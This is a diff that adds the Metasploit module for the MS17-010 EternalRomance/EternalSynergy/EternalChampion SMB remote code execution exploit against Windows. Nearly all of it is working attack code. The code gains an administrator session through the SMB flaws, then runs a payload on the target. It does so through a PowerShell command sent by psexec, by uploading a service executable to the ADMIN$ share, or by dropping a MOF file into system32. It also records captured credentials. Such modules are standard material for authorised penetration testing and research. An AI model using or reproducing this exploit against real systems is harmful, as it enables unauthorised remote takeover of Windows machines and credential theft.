@@ -1,0 +1,339 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+# Windows XP systems that are not part of a domain default to treating all
+# network logons as if they were Guest. This prevents SMB relay attacks from
+# gaining administrative access to these systems. This setting can be found
+# under:
+#
+#  Local Security Settings >
+#   Local Policies >
+#    Security Options >
+#     Network Access: Sharing and security model for local accounts
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010
+  include Msf::Exploit::Powershell
+  include Msf::Exploit::EXE
+  include Msf::Exploit::WbemExec
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution',
+      'Description'    => %q{
+        This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where
+        primitive. This will then be used to overwrite the connection session information with as an
+        Administrator session. From there, the normal psexec payload code execution is done.
+
+        Exploits a type confusion between Transaction and WriteAndX requests and a race condition in
+        Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy
+        exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a
+        named pipe.
+      },
+      'Author'         =>
+        [
+          'sleepya',          # zzz_exploit idea and offsets
+          'zerosum0x0',
+          'Shadow Brokers',
+          'Equation Group'
+        ],
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' =>
+        {
+          'WfsDelay'     => 10,
+          'EXITFUNC' => 'thread'
+        },
+      'References'     =>
+        [
+          [ 'AKA', 'ETERNALSYNERGY' ],
+          [ 'AKA', 'ETERNALROMANCE' ],
+          [ 'AKA', 'ETERNALCHAMPION' ],
+          [ 'AKA', 'ETERNALBLUE'],  # does not use any CVE from Blue, but Search should show this, it is preferred
+          [ 'MSB', 'MS17-010' ],
+          [ 'CVE', '2017-0143'], # EternalRomance/EternalSynergy - Type confusion between WriteAndX and Transaction requests
+          [ 'CVE', '2017-0146'], # EternalChampion/EternalSynergy - Race condition with Transaction requests
+          [ 'CVE', '2017-0147'], # for EternalRomance reference
+          [ 'URL', 'https://github.com/worawit/MS17-010' ],
+          [ 'URL', 'https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf' ],
+          [ 'URL', 'https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/' ],
+        ],
+      'Payload'        =>
+        {
+          'Space'        => 3072,
+          'DisableNops'  => true
+        },
+      'Platform'       => 'win',
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'Targets'        =>
+        [
+          [ 'Automatic', { } ],
+          [ 'PowerShell', { } ],
+          [ 'Native upload', { } ],
+          [ 'MOF upload', { } ]
+        ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Mar 14 2017'
+    ))
+
+    register_options(
+      [
+        OptString.new('SHARE',     [ true, "The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share", 'ADMIN$' ])
+      ])
+
+    register_advanced_options(
+      [
+        OptBool.new('ALLOW_GUEST', [true, "Keep trying if only given guest access", false]),
+        OptString.new('SERVICE_FILENAME', [false, "Filename to to be used on target for the service binary",nil]),
+        OptString.new('PSH_PATH', [false, 'Path to powershell.exe', 'Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe']),
+        OptString.new('SERVICE_STUB_ENCODER', [false, "Encoder to use around the service registering stub",nil])
+      ])
+  end
+
+  def exploit
+    begin
+      eternal_pwn(datastore['RHOST'])
+      smb_pwn()
+
+    rescue ::Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010::MS17_010_Error => e
+      print_error("#{e.message}")
+    rescue ::Errno::ECONNRESET,
+           ::Rex::Proto::SMB::Exceptions::LoginError,
+           ::Rex::HostUnreachable,
+           ::Rex::ConnectionTimeout,
+           ::Rex::ConnectionRefused  => e
+      print_error("#{e.class}: #{e.message}")
+    rescue => error
+      print_error(error.class.to_s)
+      print_error(error.message)
+      print_error(error.backtrace.join("\n"))
+    ensure
+      eternal_cleanup()       # restore session
+    end
+  end
+
+  def smb_pwn()
+    case target.name
+    when 'Automatic'
+      if powershell_installed?
+        print_status('Selecting PowerShell target')
+        powershell
+      else
+        print_status('Selecting native target')
+        native_upload
+      end
+    when 'PowerShell'
+      powershell
+    when 'Native upload'
+      native_upload
+    when 'MOF upload'
+      mof_upload
+    end
+
+    handler
+  end
+
+
+  # TODO: Again, shamelessly copypasta from the psexec exploit module. Needs to
+  #       be moved into a mixin
+
+  def powershell_installed?
+    share = "\\\\#{datastore['RHOST']}\\#{datastore['SHARE']}"
+
+    case datastore['SHARE'].upcase
+    when 'ADMIN$'
+      path = 'System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+    when 'C$'
+      path = 'Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+    else
+      path = datastore['PSH_PATH']
+    end
+
+    simple.connect(share)
+
+    vprint_status("Checking for #{path}")
+
+    if smb_file_exist?(path)
+      vprint_status('PowerShell found')
+      psh = true
+    else
+      vprint_status('PowerShell not found')
+      psh = false
+    end
+
+    simple.disconnect(share)
+
+    psh
+  end
+
+  def powershell
+    ENV['MSF_SERVICENAME'] = datastore['SERVICE_NAME']
+    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
+
+    if datastore['PSH::persist'] and not datastore['DisablePayloadHandler']
+      print_warning("You probably want to DisablePayloadHandler and use exploit/multi/handler with the PSH::persist option")
+    end
+
+    # Execute the powershell command
+    print_status("Executing the payload...")
+    begin
+      psexec(command)
+    rescue StandardError => exec_command_error
+      fail_with(Failure::Unknown, "#{peer} - Unable to execute specified command: #{exec_command_error}")
+    end
+  end
+
+  def native_upload
+    filename = datastore['SERVICE_FILENAME'] || "#{rand_text_alpha(8)}.exe"
+    servicename = datastore['SERVICE_NAME'] || rand_text_alpha(8)
+    serviceencoder = datastore['SERVICE_STUB_ENCODER'] || ''
+
+    # Upload the shellcode to a file
+    print_status("Uploading payload...")
+    smbshare = datastore['SHARE']
+    fileprefix = ""
+    # if SHARE = Users/sasha/ or something like this
+    if smbshare =~ /.[\\\/]/
+      subfolder = true
+      smbshare = datastore['SHARE'].dup
+      smbshare = smbshare.gsub(/^[\\\/]/,"")
+      folder_list = smbshare.split(/[\\\/]/)
+      smbshare = folder_list[0]
+      fileprefix = folder_list[1..-1].map {|a| a + "\\"}.join.gsub(/\\$/,"") if folder_list.length > 1
+      simple.connect("\\\\#{datastore['RHOST']}\\#{smbshare}")
+      fd = smb_open("\\#{fileprefix}\\#{filename}", 'rwct')
+    else
+      subfolder = false
+      simple.connect("\\\\#{datastore['RHOST']}\\#{smbshare}")
+      fd = smb_open("\\#{filename}", 'rwct')
+    end
+    exe = ''
+    opts = { :servicename => servicename, :serviceencoder => serviceencoder}
+    begin
+      exe = generate_payload_exe_service(opts)
+
+      fd << exe
+    ensure
+      fd.close
+    end
+
+    if subfolder
+      print_status("Created \\#{fileprefix}\\#{filename}...")
+    else
+      print_status("Created \\#{filename}...")
+    end
+
+    # Disconnect from the share
+    simple.disconnect("\\\\#{datastore['RHOST']}\\#{smbshare}")
+
+    # define the file location
+    if datastore['SHARE'] == 'ADMIN$'
+      file_location = "%SYSTEMROOT%\\#{filename}"
+    elsif datastore['SHARE'] =~ /^[a-zA-Z]\$$/
+      file_location = datastore['SHARE'].slice(0,1) +  ":\\#{filename}"
+    else
+      file_location = "\\\\127.0.0.1\\#{smbshare}\\#{fileprefix}\\#{filename}"
+    end
+
+    psexec(file_location, false)
+
+    unless datastore['SERVICE_PERSIST']
+      print_status("Deleting \\#{filename}...")
+      #This is not really useful but will prevent double \\ on the wire :)
+      if datastore['SHARE'] =~ /.[\\\/]/
+        simple.connect("\\\\#{datastore['RHOST']}\\#{smbshare}")
+        begin
+          simple.delete("\\#{fileprefix}\\#{filename}")
+        rescue XCEPT::ErrorCode => e
+          print_error("Delete of \\#{fileprefix}\\#{filename} failed: #{e.message}")
+        end
+      else
+        simple.connect("\\\\#{datastore['RHOST']}\\#{smbshare}")
+        begin
+          simple.delete("\\#{filename}")
+        rescue XCEPT::ErrorCode => e
+          print_error("Delete of \\#{filename} failed: #{e.message}")
+        end
+      end
+    end
+  end
+
+  def mof_upload
+    share = "\\\\#{datastore['RHOST']}\\ADMIN$"
+    filename = datastore['SERVICE_FILENAME'] || "#{rand_text_alpha(8)}.exe"
+
+    # payload as exe
+    print_status("Trying wbemexec...")
+    print_status("Uploading Payload...")
+    if datastore['SHARE'] != 'ADMIN$'
+      print_error('Wbem will only work with ADMIN$ share')
+      return
+    end
+    simple.connect(share)
+    exe = generate_payload_exe
+    fd = smb_open("\\system32\\#{filename}", 'rwct')
+    fd << exe
+    fd.close
+    print_status("Created %SystemRoot%\\system32\\#{filename}")
+
+    # mof to cause execution of above
+    mofname = rand_text_alphanumeric(14) + ".MOF"
+    mof = generate_mof(mofname, filename)
+    print_status("Uploading MOF...")
+    fd = smb_open("\\system32\\wbem\\mof\\#{mofname}", 'rwct')
+    fd << mof
+    fd.close
+    print_status("Created %SystemRoot%\\system32\\wbem\\mof\\#{mofname}")
+
+    # Disconnect from the ADMIN$
+    simple.disconnect(share)
+  end
+
+  def report_auth
+    service_data = {
+        address: ::Rex::Socket.getaddress(datastore['RHOST'],true),
+        port: datastore['RPORT'],
+        service_name: 'smb',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+        origin_type: :service,
+        module_fullname: self.fullname,
+        private_data: datastore['SMBPass'],
+        username: datastore['SMBUser'].downcase
+    }
+
+    if datastore['SMBDomain'] and datastore['SMBDomain'] != 'WORKGROUP'
+      credential_data.merge!({
+        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+        realm_value: datastore['SMBDomain']
+       })
+    end
+
+    if datastore['SMBPass'] =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/
+      credential_data.merge!({:private_type => :ntlm_hash})
+    else
+      credential_data.merge!({:private_type => :password})
+    end
+
+    credential_data.merge!(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+        access_level: 'Admin',
+        core: credential_core,
+        last_attempted_at: DateTime.now,
+        status: Metasploit::Model::Login::Status::SUCCESSFUL
+    }
+
+    login_data.merge!(service_data)
+    create_credential_login(login_data)
+  end
+end
